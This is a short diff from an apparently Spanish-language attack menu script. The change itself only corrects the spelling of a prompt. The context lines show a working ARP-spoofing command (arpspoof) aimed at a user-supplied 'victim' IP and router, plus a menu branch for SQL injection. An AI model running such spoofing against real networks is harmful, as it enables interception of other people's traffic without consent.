@@ -29,7 +29,7 @@ do
 		echo    "SELECCIONE UNA DIRECCION IP"
 		read -p "DIRECCION IP DE LA VICTIMA :" o
 		read -p "IP(ROUNTER ej: 192.168.0.1) :" a 
-		read -p "INTERFAS DE RED (Wlan0 o wlan1 o eth0 ) :" l
+		read -p "INTERFAZ DE RED (Wlan0 o wlan1 o eth0 ) :" l
 		echo "COMENZANDO CON EL ATAQUE"
 		sudo arpspoof -i $l -t $o -r $a  
 	elif [ $opcion = "INYECCIÓN_SQL" ]; then
